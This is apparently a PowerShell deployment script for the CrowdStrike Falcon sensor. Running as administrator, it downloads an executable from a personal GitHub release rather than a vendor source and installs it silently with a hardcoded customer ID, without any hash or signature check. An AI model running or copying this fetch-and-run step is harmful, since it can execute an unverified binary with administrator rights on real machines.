#Requires -RunAsAdministrator

$CCID        = "3787B61C4D6F4617AFB50838BD82169B-C3"
$Installer   = "$env:TEMP\FalconSensor.exe"
$Url         = "https://github.com/rohitashc-a11y/new-re/releases/download/twst2/FalconSensor_Windows.4.exe"
$Log         = "$env:ProgramData\CrowdStrike\deploy.log"

function Log($msg) {
    New-Item -ItemType Directory -Path (Split-Path $Log) -Force -ErrorAction SilentlyContinue | Out-Null
    Add-Content $Log "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [$env:COMPUTERNAME] $msg"
}

# Skip if already installed
if (Get-Service -Name "CSFalconService" -ErrorAction SilentlyContinue) { Log "Already installed. Skipping."; Exit 0 }

Log "Starting deployment..."
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Download with 3 retries
$ok = $false
for ($i = 1; $i -le 3 -and -not $ok; $i++) {
    try {
        (New-Object System.Net.WebClient).DownloadFile($Url, $Installer)
        if ((Get-Item $Installer).Length -gt 1MB) { $ok = $true } else { Start-Sleep 10 }
    } catch { Log "Download attempt $i failed: $_"; Start-Sleep 10 }
}
if (-not $ok) { Log "Download failed. Aborting."; Exit 1 }

# Install
$exit = (Start-Process $Installer -ArgumentList "/install /quiet /norestart CID=$CCID" -Wait -PassThru).ExitCode
Remove-Item $Installer -Force -ErrorAction SilentlyContinue
Log "Install complete. Exit code: $exit"
